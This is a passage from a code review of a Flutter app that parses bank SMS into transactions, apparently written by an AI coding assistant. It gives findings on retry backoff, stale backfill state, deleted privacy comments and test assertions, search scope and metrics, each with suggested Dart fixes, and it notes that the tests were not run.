`if (senderCounts.isEmpty) return const SizedBox.shrink()`
(`unparsed_sms_screen.dart:230,258`) and the cards vanish. For a diagnostic
screen, "the query failed" and "everything parsed perfectly" render identically —
the most misleading possible failure mode, since a developer concludes capture
coverage is complete.

Both are also plain `Provider`s, so the derived lists live for the app's lifetime
and recompute in full on every stream emission.

**Suggested fix** — preserve `AsyncValue` and autoDispose:

```dart
/// Unparsed SMS grouped by rejection reason, count descending.
///
/// Returns AsyncValue rather than a bare list: collapsing loading/error to
/// an empty list makes a failed query indistinguishable from full coverage.
final unparsedReasonCountsProvider =
    Provider.autoDispose<AsyncValue<List<MapEntry<UnparsedReason, int>>>>((ref) {
  return ref.watch(unparsedSmsListProvider).whenData((unparsed) {
    final counts = <UnparsedReason, int>{};
    for (final item in unparsed) {
      final reason = categorizeUnparsedSms(item.body);
      counts[reason] = (counts[reason] ?? 0) + 1;
    }
    return counts.entries.toList()
      // Secondary key keeps ties stable so the card doesn't reorder on rebuild.
      ..sort((a, b) {
        final byCount = b.value.compareTo(a.value);
        return byCount != 0 ? byCount : a.key.label.compareTo(b.key.label);
      });
  });
});
```

Render `loading` and `error` explicitly in both summary cards.

---

### M15 — `downloadModelWithRetry` has no backoff

**Severity:** MAJOR
**Location:** `lib/intelligence/llm/llm_runtime.dart:45-56,137-148`

The task specifies backoff; the implementation waits a constant `delay` between
every attempt:

```dart
if (attempt < maxRetries - 1 && delay > Duration.zero) {
  await Future<void>.delayed(delay);   // always 1s
}
```

Three attempts 1s apart is ~2 seconds of total tolerance. A model download that
fails from a flaky mobile connection or a network transition needs seconds to
tens of seconds. This retries too fast to help and gives up too early.

**Suggested fix** — exponential backoff with jitter and a cap:

```dart
Future<bool> downloadModelWithRetry({
  int maxRetries = 3,
  Duration delay = const Duration(seconds: 1),
  Duration maxDelay = const Duration(seconds: 30),
}) async {
  final random = Random();
  for (var attempt = 0; attempt < maxRetries; attempt++) {
    if (await downloadModel()) return true;
    if (attempt == maxRetries - 1 || delay <= Duration.zero) break;
    // Exponential backoff with full jitter, capped: a large model download
    // over a flaky mobile link needs seconds, not a fixed 1s poll.
    final backoff = delay * (1 << attempt);
    final capped = backoff > maxDelay ? maxDelay : backoff;
    await Future<void>.delayed(
      Duration(milliseconds: random.nextInt(capped.inMilliseconds + 1)),
    );
  }
  return false;
}
```

The test at `llm_runtime_test.dart:277` passes `delay: Duration.zero` and asserts
only the call count, so it verifies retry but not backoff. Add a fake clock or
assert on elapsed `FakeAsync` time.

---

### M16 — Retry logic triplicated; abstract default body is dead code; Noop diverges

**Severity:** MAJOR
**Location:** `lib/intelligence/llm/llm_runtime.dart:45,137,316`

`LlmRuntime` is an abstract class with a concrete `downloadModelWithRetry` body,
but both implementations use `implements LlmRuntime`, not `extends`. Dart requires
`implements` to supply every member, so:

- The body at `:45` is **unreachable dead code**.
- `PlatformLlmRuntime:137` is a verbatim copy-paste.
- `NoopLlmRuntime:316` returns `false` immediately — never calling
  `downloadModel()`, never retrying. Its semantics silently differ from the
  contract.

Any future runtime that `implements` will re-derive this a fourth time.
`_FakeLlmRuntime` in `settings_test.dart:53` already overrides it to bypass retry
entirely, so **no test exercises the real retry path through the settings UI**.

**Suggested fix** — a mixin, so behavior cannot drift:

```dart
/// Shared retry policy. A mixin rather than an abstract method body: both
/// runtimes use `implements`, which does not inherit bodies, so a default
/// implementation on LlmRuntime is unreachable and gets copy-pasted.
mixin LlmDownloadRetry on LlmRuntime {
  @override
  Future<bool> downloadModelWithRetry({
    int maxRetries = 3,
    Duration delay = const Duration(seconds: 1),
  }) async {
    // ...single implementation (see M15)
  }
}

class PlatformLlmRuntime with LlmDownloadRetry implements LlmRuntime { /* ... */ }
class NoopLlmRuntime    with LlmDownloadRetry implements LlmRuntime { /* ... */ }
```

---

### M17 — Retry cannot distinguish network failure from unsupported device

**Severity:** MAJOR
**Location:** `lib/intelligence/llm/llm_runtime.dart:154-162` · `lib/features/settings/settings_screen.dart:669-707`

`_boolCall` maps both `PlatformException` and `MissingPluginException` to
`false`. So `downloadModel()` returns `false` identically for a transient network
error, an unsupported device, and a missing native plugin. `downloadModelWithRetry`
therefore burns all 3 attempts plus backoff on permanently unsupported
configurations, then shows:

> "The AI model download was interrupted or failed. Check your internet
> connection and try again."

which is actively wrong on a device that will never support the model, and offers
a Retry button that cannot succeed.

Separately, `_download` sets `_available = succeeded` on failure
(`settings_screen.dart:674`). If the model was already present and a re-download
failed, the UI now reports the model as absent.

**Suggested fix:**

```dart
Future<void> _download() async {
  final runtime = ref.read(llmRuntimeProvider);
  // Distinguish "cannot ever work" from "transient": _boolCall collapses
  // MissingPluginException and PlatformException into the same `false`, so
  // retrying an unsupported device wastes the full backoff and then blames
  // the user's network.
  if (!await runtime.isDeviceSupported()) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('This device does not support the AI model')),
    );
    return;
  }

  setState(() => _busy = true);
  final succeeded = await runtime.downloadModelWithRetry();
  if (!mounted) return;
  setState(() => _busy = false);
  // Re-read actual state rather than inferring it: a failed re-download must
  // not mark an already-present model as absent.
  await _refresh();
  if (!succeeded) {
    _showDownloadFailureDialog();
  } else {
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('AI model downloaded')),
    );
  }
}
```

Better still, have `downloadModel` return a reason enum (the file already has
`LlmUnavailableReason` and `_reasonFor` at `:164`) so the retry loop can skip
non-retryable failures.

---

### M18 — Backfill status is stale on re-run and discards the final count

**Severity:** MAJOR
**Location:** `lib/capture/sms_backfill.dart:487-503,462-474`

Three related defects:

1. **No reset at run start.** `smsBackfillProvider` re-runs whenever
   `smsPermissionControllerProvider` emits (`:485`). On re-run the notifier still
   holds `stage: completed` and the previous `processed` count, and nothing sets
   `running` until the first `onProgress` tick. The UI shows a stale completed
   count during a live import.
2. **`markCompleted()` discards `result.processed`.** It only `copyWith`s the
   stage, so the displayed count is whatever the last progress tick reported —
   which may be lower than the true total if the final page emits no tick.
3. **`_active` memoization drops the new `onProgress`.**
   `SmsHistoryImportRunner.run` is `return _active ??= _run(...)` (`:286`). If a
   run is already in flight, the second caller receives the first future and its
   `onProgress` callback is **silently ignored** — status stays `idle` and then
   jumps to `completed`.

**Suggested fix:**

```dart
final smsBackfillProvider = FutureProvider<int>((ref) async {
  final permission = ref.watch(smsPermissionControllerProvider).valueOrNull;
  if (permission != SmsPermissionStatus.granted) return 0;
  // Keep inbox/database maintenance out of the first rendered frame. The
  // incremental path is page-bounded, so an arbitrary wall-clock delay is no
  // longer needed and would leave timers behind when widget tests dispose.
  await WidgetsBinding.instance.endOfFrame;
  final notifier = ref.read(smsBackfillStatusProvider.notifier);
  // Reset before awaiting: this provider re-runs on permission changes and
  // would otherwise render the previous run's completed count as live.
  notifier.markRunning();
  try {
    final runner = await ref.watch(smsHistoryImportRunnerProvider.future);
    final result = await runner.run(
      force: false,
      onProgress: (progress) => notifier.updateProgress(
        processed: progress.processed,
        failed: progress.failed,
      ),
    );
    // Trust the result over the last progress tick — the final page may not
    // emit one.
    notifier.markCompleted(processed: result.processed, failed: result.failed);
    return result.processed;
  } catch (error, stackTrace) {
    notifier.markFailed();
    // Keep diagnostics content-free: platform/query errors are actionable,
    // while SMS sender/body data must never enter logs.
    developer.log(/* ... */);
    // ...
  }
});
```

```dart
class SmsBackfillStatusNotifier extends StateNotifier<SmsBackfillStatusState> {
  SmsBackfillStatusNotifier() : super(const SmsBackfillStatusState());

  void markRunning() => state = const SmsBackfillStatusState(
        stage: SmsBackfillStage.running,
      );

  void markCompleted({required int processed, required int failed}) =>
      state = state.copyWith(
        stage: SmsBackfillStage.completed,
        processed: processed,
        failed: failed,
      );
}
```

For (3), have `run` reject or multiplex concurrent callers rather than dropping
the callback.

---

### M19 — Two privacy/architecture comments deleted from `smsBackfillProvider`

**Severity:** MAJOR
**Location:** `lib/capture/sms_backfill.dart:481-502`

The diff removes two load-bearing comments:

```
-  // Keep inbox/database maintenance out of the first rendered frame. The
-  // incremental path is page-bounded, so an arbitrary wall-clock delay is no
-  // longer needed and would leave timers behind when widget tests dispose.
```
```
-    // Keep diagnostics content-free: platform/query errors are actionable,
-    // while SMS sender/body data must never enter logs.
```

The second is the **only in-code statement of the no-raw-SMS-in-logs
invariant** at the exact call site where it could be violated. `developer.log`
sits two lines below, and adding `error: error` there is a natural "improvement"
for the next maintainer. The first explains why `await endOfFrame` exists rather
than a delay, which prevents someone reintroducing a timer that breaks widget
test teardown.

Neither comment was made obsolete by this change. Restore both (included in the
M18 snippet above).

---

### M20 — Clear (✕) button resets the filter but leaves stale text visible

**Severity:** MAJOR
**Location:** `lib/features/review/weekly_review_screen.dart:408-412` · `lib/features/settings/payee_labels_screen.dart:56-60`

Both search fields are uncontrolled — `onChanged` only, no `TextEditingController`.
The clear button does:

```dart
onPressed: () => setState(() => _searchQuery = ''),
```

This resets the filter state but never clears the `EditableText`'s own buffer, so
the field still displays the old query while the full unfiltered list is shown.
The ✕ then disappears (it is conditional on `_searchQuery.isNotEmpty`), leaving
the user with visible text they cannot clear except by manual deletion.

Neither test covers this: the payee test clears via
`enterText(..., '')` (`payee_labels_screen_test.dart:60`), bypassing the button
entirely, and the review test never clears at all.

**Suggested fix** — add a controller and dispose it (also closing the missing-dispose gap):

```dart
class _ReviewListState extends State<_ReviewList> {
  final _searchController = TextEditingController();
  String _searchQuery = '';

  @override
  void dispose() {
    _searchController.dispose();
    super.dispose();
  }

  // ...
  TextField(
    key: const ValueKey('review_search_field'),
    controller: _searchController,
    decoration: InputDecoration(
      // ...
      suffixIcon: _searchQuery.isNotEmpty
          ? IconButton(
              icon: const Icon(Icons.clear),
              onPressed: () {
                // Clear the field too — resetting only _searchQuery leaves
                // stale text rendered with an unfiltered list.
                _searchController.clear();
                setState(() => _searchQuery = '');
                FocusScope.of(context).unfocus();
              },
            )
          : null,
    ),
    onChanged: (value) => setState(() => _searchQuery = value),
  )
```

Test the button, not just `enterText('')`:

```dart
await tester.tap(find.byIcon(Icons.clear));
await tester.pumpAndSettle();
expect(find.widgetWithText(TextField, 'Zomato'), findsNothing);
expect(find.text('Swiggy Food'), findsOneWidget);
```

---

### M21 — Review search only sees the loaded page, not the backlog

**Severity:** MAJOR
**Location:** `lib/features/review/weekly_review_screen.dart:378-392`

`_ReviewList` receives one paginated page (`reviewQueueLimitProvider`, page size
`reviewPageSize`) plus `remainingCount`, and filters `widget.items` client-side.
Matches in the unloaded remainder are invisible, and nothing signals that the
result set is partial — the "Load N more" button keeps its normal label while
the newly loaded rows are also silently filtered.

On a screen whose task is "Review Backlog UI **Scaling**", a user who searches
for a transaction that exists beyond the current page sees an empty list and
concludes it isn't there. `payee_labels_screen.dart` has the same shape but is
not paginated, so it is unaffected.

**Suggested fix** — push the predicate into the query:

```dart
// transactions_providers.dart
final reviewSearchQueryProvider = StateProvider<String>((ref) => '');

final reviewQueueProvider = StreamProvider<List<TransactionReviewItem>>((ref) {
  final databaseAsync = ref.watch(appDatabaseProvider);
  final limit = ref.watch(reviewQueueLimitProvider);
  final search = ref.watch(reviewSearchQueryProvider);
  return databaseAsync.when(
    data: (database) => ref
        .watch(transactionRepositoryProvider(database))
        .watchReviewQueue(limit: limit, search: search),
    // ...
  );
});
```

Debounce keystrokes (~250 ms) so each character doesn't re-issue the query. If
client-side filtering must stay for now, at least make the truncation visible:

```dart
if (widget.remainingCount > 0 && _searchQuery.isNotEmpty)
  Padding(
    padding: AppSpacing.screen,
    child: Text(
      'Searching ${widget.items.length} loaded of '
      '${widget.items.length + widget.remainingCount} — load more to widen.',
      style: Theme.of(context).textTheme.bodySmall,
    ),
  ),
```

---

### M22 — Privacy-path assertion deleted from the sanitized-share test

**Severity:** MAJOR
**Location:** `test/features/dev/unparsed_sms_screen_test.dart:196-201`

The diff replaces the Cancel flow and its assertion with a bare teardown:

```diff
   await tester.tap(find.byTooltip('Share sanitized SMS'));
-  await tester.pumpAndSettle();
-  await tester.tap(find.text('Cancel'));
-  await tester.pumpAndSettle();
-  expect(copyCalls, 0);
+  await tester.pumpWidget(const SizedBox());
+  await tester.pump(const Duration(milliseconds: 1));
```

The test now taps the share button and asserts **nothing**. It cannot fail
except by throwing. The deleted `expect(copyCalls, 0)` verified that cancelling
the sanitized-SMS share dialog does not copy SMS content to the clipboard —
a privacy guarantee, now unverified.

If the change was to silence a pending-timer failure, keep the assertions and
add the teardown after them.

**Suggested fix:**

```dart
await tester.tap(find.byTooltip('Share sanitized SMS'));
await tester.pumpAndSettle();
await tester.tap(find.text('Cancel'));
await tester.pumpAndSettle();

// Cancelling must never place SMS content on the clipboard.
expect(copyCalls, 0);

await tester.pumpWidget(const SizedBox());
await tester.pump(const Duration(milliseconds: 1));
```

---

### M23 — `averageParseConfidence` is not a model-quality metric

**Severity:** MAJOR
**Location:** `lib/features/dev/model_metrics_screen.dart:70-99,151-156`

The average pools every `parse_source`, but confidence is assigned by
construction per source: `manual` rows are written at 1.0
(`insertManual`), `template` at 0.97 (`field_normalizer.dart:38`), `public`
templates at 0.85, `generic` at ≤0.6. The headline "Avg Parse Confidence" therefore
mostly measures **how many transactions the user typed in by hand** — it rises as
parsing gets worse and the user compensates manually.

Compounding it:

- Rows without a `parser` entry are dropped from the denominator with no
  disclosure.
- `0.0` doubles as both "no data" and a real zero, and the UI hides the row on
  `> 0` (`:151`), so the two are indistinguishable.
- `catch (_) {}` at `:85` catches `Error` as well as `Exception` (including
  `StackOverflowError`), silently hiding real bugs. The same extraction elsewhere
  in the codebase correctly narrows to `on FormatException` / `on TypeError`
  (`transaction_repository.dart:723-728`) — and this is now the **third** copy of
  that logic.

**Suggested fix:**

```dart
// Confidence is assigned per parse_source by construction (manual 1.0,
// template 0.97, public 0.85, generic <=0.6), so a pooled average mostly
// tracks how many rows the user entered by hand. Break it down instead.
final confidenceBySource = <String, ({double sum, int n})>{};
for (final txn in transactions) {
  sourceCounts[txn.parseSource] = (sourceCounts[txn.parseSource] ?? 0) + 1;
  final conf = parseConfidenceOf(txn);  // shared helper, extracted
  if (conf == null) continue;
  final prior = confidenceBySource[txn.parseSource] ?? (sum: 0.0, n: 0);
  confidenceBySource[txn.parseSource] = (sum: prior.sum + conf, n: prior.n + 1);
}

return ModelMetrics(
  // null (not 0.0) means "no data" so the UI can say so explicitly.
  averageParseConfidenceBySource: {
    for (final e in confidenceBySource.entries)
      e.key: e.value.n == 0 ? null : e.value.sum / e.value.n,
  },
  // ...
);
```

Extract the shared reader to remove the triplication:

```dart
// lib/data/confidence_payload.dart
/// Reads `parser.c` from a confidence_json payload, or null when absent.
double? parseConfidenceFromJson(String confidenceJson) {
  try {
    final decoded = jsonDecode(confidenceJson) as Map<String, Object?>;
    final parser = decoded['parser'] as Map<String, Object?>?;
    return (parser?['c'] as num?)?.toDouble();
  } on FormatException {
    return null;   // narrow: bare `catch (_)` also swallows Errors
  } on TypeError {
    return null;
  }
}
```

---

## MINOR

- **`lib/features/backup/encrypted_backup_service.dart:112`** — archive `version`
  stays `2` while four tables were added. Restore tolerates absence via
  `_optionalTableRows`, so old→new works, but new→old silently drops
  `baselines`/`insights`/`model_meta`/`recurring_series` with no warning. Bump to
  `3`, accept `1|2|3` in `_validateArchive`, and warn on downgrade.

- **`lib/features/backup/encrypted_backup_service.dart:225,239`** —
  `row as Map` throws a raw `TypeError` on a malformed archive, escaping
  `importBytes` as an unwrapped error rather than `EncryptedBackupException`. The
  four new tables widen this surface. Wrap `_restoreArchive` in the same
  `on TypeError` → `EncryptedBackupException` mapping used by `_decrypt`.
  (Atomicity itself is fine — the throw propagates out of
  `database.transaction`, so Drift rolls back.)

- **`lib/features/settings/category_manager_screen.dart:234-238`** — the dialog
  enumerates consequences but omits one: `mergeCategory` also re-parents child
  categories (`parentId` update). It also shows no affected-row count, which is
  the single most useful number for judging a destructive retro-application.
  Query `COUNT(*)` first and render "This will recategorize 1,247 transactions
  and move 3 subcategories."

- **`lib/features/settings/payee_labels_screen.dart:32`** —
  `item.userLabel != null` treats an empty-string label as labelled, so
  `''`-labelled payees are hidden by "Unlabeled only". Use
  `(item.userLabel?.trim().isEmpty ?? true)`.

- **`lib/features/dev/model_metrics_screen.dart:125,131,148,152`** — hardcoded
  `12.0`/`16.0`/`24` paddings instead of the `AppSpacing` tokens used across the
  rest of the app.

- **`lib/features/dev/model_metrics_screen.dart:56-70`** — loads every
  transaction row to compute counts and an average. `SELECT parse_source,
  COUNT(*), AVG(...) ... GROUP BY parse_source` does this without materializing
  the table.

- **`lib/features/dev/transaction_export.dart:100,116`** — `writeln` emits LF;
  RFC 4180 specifies CRLF. Also no UTF-8 BOM, so Excel misrenders Devanagari
  merchant names — relevant for an India-focused app. Prepend `﻿` in
  `exportCsvBytes`.

- **`lib/capture/sms_backfill.dart:432-455`** — `SmsBackfillStatusState` has no
  `==`/`hashCode`, so every `copyWith` is a new identity and listeners rebuild
  even when values are unchanged. Add value equality.

- **`lib/capture/sms_backfill.dart:115-120`** — `SmsImportProgress` carries
  `processed`/`failed` but no `total`, so the T-090 "progress indicator" can only
  ever be indeterminate. If the inbox count is known before the scan, thread it
  through.

- **`lib/features/review/weekly_review_screen.dart:400`** — `ListView(children:)`
  builds every group header and tile eagerly. On a task about UI scaling this
  should be `ListView.builder` or a `SliverList` over a flattened section model.

- **Scope discrepancy** — the task map lists
  `lib/features/dev/template_engine_screen.dart` under T-108. That file does not
  exist; the actual registry change is in `lib/capture/sms_ingestion.dart:37-38`.
  Update the task record.

---

## NIT

- `lib/features/dev/unparsed_sms_screen.dart:230-290` — both summary `Text`
  widgets lack `maxLines`/`overflow`. Two cards plus the trust alert in a
  non-scrollable `Column` above `Expanded` can overflow on a small screen.
- `test/features/review/weekly_review_screen_test.dart:435-471` — the new search
  test omits the
  `pumpWidget(SizedBox()) + pump(1ms)` teardown that every neighbouring test
  uses; the review stream is a never-closing `Stream.value`, so this may flake.
- `test/features/review/weekly_review_screen_test.dart:224` —
  `find.byType(ListView).first` is positional and now depends on the search
  field's position in the tree. Prefer a `ValueKey` on the list.
- `test/features/dev/model_metrics_screen_test.dart:190` — the test is named
  "computes parse source breakdown **and avg parse confidence**" but never
  asserts on `averageParseConfidence`, and covers only `template` (not `generic`,
  `manual`, `rule`).
- `assets/templates/hdfcbk.json:9` — `(?<account>\d+)` is unbounded here but
  `\d{4}` in the sibling templates. Harmless (the trailing ` to ` delimits it)
  but inconsistent.
- `assets/templates/hdfcbk.json:3-4`, `icicib.json:3-4` — sender patterns require
  a two-letter DLT prefix. `centbk.json` uses `^[A-Z]{2}-?CENTBK...` and
  `kotak.json` adds a bare-header alternative; consider `-?` for parity with
  senders that arrive without the prefix. Note `TemplateRegistry.fromJson:21`
  builds these with `RegExp.new` (case-**sensitive**), unlike `SmsTemplate` which
  passes `caseSensitive: false`.
- `assets/templates/*.json` — `[\d,]+\.?\d*` accepts degenerate values like
  `,,,`, which then fail in `parseAmount` and are silently skipped. Tighten to
  `\d{1,3}(?:,\d{2,3})*(?:\.\d{1,2})?|\d+(?:\.\d{1,2})?`.

---

## What Looks Good

- **No SMS content enters logs.** Grepped every added line for
  `print`/`debugPrint`/`developer.log` — the only new logging is the existing
  content-free `developer.log` call. The zero-networking-for-parsing property
  also holds; nothing in the parse path gained a network dependency.
- **T-110 restore ordering and atomicity are correct.** Deletes run in
  reverse-dependency order, inserts in dependency order with the new tables last,
  all inside `database.transaction` so a mid-restore failure rolls back cleanly.
  `_optionalTableRows` is the right call for backward compatibility with v1/v2
  archives.
- **T-110's `_decrypt` hardening is genuinely careful** — bounded Argon2
  parameters, salt/nonce/MAC length validation, `memory >= 8 * parallelism`, and
  a distinct message for `SecretBoxAuthenticationError`. This resists a malicious
  archive driving the KDF into a DoS.
- **T-096 uses `context.mounted` correctly** after both awaits, and returns a
  nullable `bool` from `showDialog` with a `confirmed != true` check that handles
  barrier dismissal.
- **T-120's `import 'package:drift/drift.dart' hide Column;`** is exactly the
  right fix for the Drift/Flutter `Column` collision.
- **`_DetailSection` is an `ExpansionTile`**, so T-118's evidence really is
  collapsed by default — the progressive-disclosure half of the requirement is
  met.
- **T-116/T-117 tests use `pumpAndSettle` plus explicit
  `pumpWidget(SizedBox())` teardown**, which is the correct pattern for these
  never-closing test streams.

---

## Recommended Merge Order

1. **C1 + C2 together** — never land the date fix without the provenance
   downgrade, or unverified regexes begin silently auto-labelling at 0.97.
2. **C3** — hoist search state to the parent; add the select-all regression test.
3. **M1–M3** — align retro-application with `RuleRepository`, escape LIKE
   wildcards, add the expression indexes.
4. **M4 + M5** — remove the import-side floor before any user creates a backup
   under the new rule.
5. **M6–M8** — fix escaping, formatting, and either wire up or remove the CSV
   exporter.
6. **M10, M22** — restore real test coverage; these are what let C1 and the
   privacy regression through.
7. Remaining MAJORs, then MINOR/NIT.

**Not verified in this review:** `flutter analyze` and `flutter test` were not
run — the vendored SDK at `.tooling/flutter` is a macOS arm64 build and this
review ran on Linux. Run both locally. Per `CLAUDE.md`, also run
`detect_changes({scope: "compare", base_ref: "main"})` and `impact` on
`_correctionTargets`, `parseDate`, and `downloadModelWithRetry` before editing —
`parseDate` in particular is shared by all 8 template registries.
